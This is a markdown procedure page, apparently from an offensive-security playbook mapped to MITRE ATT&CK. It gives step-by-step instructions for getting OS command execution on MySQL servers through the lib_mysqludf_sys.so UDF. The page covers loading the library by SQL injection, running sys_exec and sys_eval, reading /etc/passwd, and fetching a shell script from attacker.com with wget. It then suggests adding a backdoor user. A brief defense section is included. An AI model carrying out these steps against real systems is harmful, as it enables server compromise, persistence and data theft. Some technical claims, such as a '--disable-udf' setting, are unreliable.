---
id: ab79a658-3f1b-4c9d-ac36-33a9fe4c5426
name: MySQL-UDF-Command-Execution-via-lib_mysqludf_sys.so
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:34.973249+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - '[[techniques/Execution through API|T1106 - Execution through API]]'
  - >-
    [[techniques/Exploitation for Privilege Escalation|T1068 - Exploitation for
    Privilege Escalation]]
  - '[[techniques/User Execution|T1204 - User Execution]]'
sub_techniques: []
tags:
  - '[[tags/MySQL-Injection]]'
  - '[[tags/MySQL-UDF-Command-Execution]]'
commands:
  - '[[commands/whereis-lib-mysqludf-sys-so]]'
  - '[[commands/mysql-sys-exec-ls-directory]]'
  - '[[commands/mysql-sys-eval-id]]'
platforms:
  - Linux
tools: []
validated: true
---

# MySQL-UDF-Command-Execution-via-lib_mysqludf_sys.so

## Summary

This procedure demonstrates how to achieve remote command execution (RCE) on a MySQL database server by leveraging the lib_mysqludf_sys.so user-defined function (UDF) library. Once the library is loaded into the MySQL instance (typically via a SQL injection vulnerability), attackers can use SQL functions like sys_exec and sys_eval to run arbitrary operating system commands, enabling privilege escalation, data exfiltration, or further compromise of the host system.

## Description

The lib_mysqludf_sys.so library is a malicious UDF that extends MySQL's functionality to execute shell commands directly from SQL queries. This technique exploits MySQL's ability to load external libraries, often requiring initial access through SQL injection to upload and register the UDF. Once loaded, functions such as sys_exec (for executing commands with arguments) and sys_eval (for evaluating commands in a shell context) allow arbitrary OS command execution under the MySQL process's privileges (often root or a low-privilege user). This is particularly dangerous on Linux-based database servers, as it bypasses application-layer restrictions. The procedure assumes the UDF is already installed or uploadable; if not, an initial SQL injection vector is needed to place the .so file in a writable directory like /tmp and create the function using CREATE FUNCTION.

## Requirements

1. Valid credentials or SQL injection vulnerability granting write access to MySQL (e.g., ability to execute CREATE FUNCTION and load libraries).
2. Access to the MySQL server via a client like mysql command-line tool or a web-based interface.
3. The lib_mysqludf_sys.so binary available (can be compiled from source or downloaded; target architecture must match, e.g., x86_64 Linux).
4. Secure file permissions (MySQL process must have execute permissions on the .so file).
5. Knowledge of the MySQL version (compatible with MySQL 5.x+; secure_file_priv restrictions may need bypassing).

## Defense

- Keep MySQL patched to the latest version and disable UDF loading by setting --disable-udf in my.cnf or using AppArmor/SELinux to restrict library loading.
- Implement strict input validation and prepared statements to prevent SQL injection.
- Run MySQL as a non-root user and restrict file system access (e.g., no write to plugin directories).
- Monitor MySQL logs for suspicious CREATE FUNCTION or UNHEX() usage, and enable query logging to detect sys_exec/sys_eval calls.
- Use database firewalls like ModSecurity to block UDF-related payloads.

## Objectives

1. Verify the presence of the lib_mysqludf_sys.so library on the server.
2. Execute arbitrary system commands via MySQL UDF functions to achieve RCE.
3. Escalate privileges or gather system information (e.g., current user ID) for further exploitation.
4. Exfiltrate data or establish persistence on the host.

## Instructions

### Step 1: Verify UDF Library Installation

**Context**: Before using the UDF, confirm if lib_mysqludf_sys.so is already present on the file system. This library must be in a directory accessible to the MySQL process (e.g., /usr/lib or /tmp). If not found, upload it via SQL injection using SELECT LOAD_FILE or INTO OUTFILE.

**Command** ([[commands/whereis-lib-mysqludf-sys-so]]):
```bash
whereis lib_mysqludf_sys.so
```

> The whereis utility locates the library file. Run this on the server shell if you have OS access, or via a prior RCE. Expected output shows the path if installed (e.g., /usr/lib/lib_mysqludf_sys.so). If empty, the library needs to be uploaded and loaded manually.

### Step 2: Load the UDF if Not Present (Optional Prerequisite)

**Context**: If the library is missing, use SQL injection to upload it. Compile or obtain lib_mysqludf_sys.so, then use MySQL's file operations to place it in a plugin directory. Create the functions sys_exec and sys_eval.

**Instructions**: Assuming SQL injection access:
1. Upload the .so: `SELECT LOAD_FILE('/path/to/lib_mysqludf_sys.so') INTO DUMPFILE '/tmp/lib_mysqludf_sys.so';`
2. Create function: `CREATE FUNCTION sys_exec RETURNS STRING SONAME 'lib_mysqludf_sys.so'; CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.so';`

> Verify loading with `SELECT sys_exec('echo loaded');`. Success: Returns 'loaded' without errors.

### Step 3: Execute a System Command via sys_exec

**Context**: Use sys_exec to run a command like listing directory contents. This function takes a command string and optional arguments, executing it directly without a shell.

**Command** ([[commands/mysql-sys-exec-ls-directory]]):
```sql
SELECT sys_exec('ls', '-l');
```

> This executes 'ls -l' on the server. sys_exec is ideal for commands without shell features (e.g., no pipes). Expected output: A result set showing directory listing (e.g., file permissions, sizes). Errors indicate UDF not loaded or permissions issues.

### Step 4: Retrieve System User Information via sys_eval

**Context**: Use sys_eval to run shell commands that require evaluation (e.g., 'id' for user details). This function pipes the command through /bin/sh, allowing complex executions.

**Command** ([[commands/mysql-sys-eval-id]]):
```sql
SELECT sys_eval('id');
```

> Connect to MySQL first: `mysql -u root -p`. Then run the query. Expected output: Table with uid/gid info (e.g., uid=118(mysql) gid=128(mysql)). This confirms RCE under MySQL's user context, aiding privilege assessment.

### Step 5: Escalate or Exfiltrate

**Context**: With RCE confirmed, chain commands for further objectives, e.g., `SELECT sys_eval('cat /etc/passwd');` for user enumeration or `SELECT sys_exec('wget http://attacker.com/shell.sh');` for payload download.

**Instructions**: Build on prior steps; test with low-impact commands first. Verify each with expected outputs like file contents or download confirmations.

> If successful, proceed to persistence (e.g., add backdoor user) or data theft.
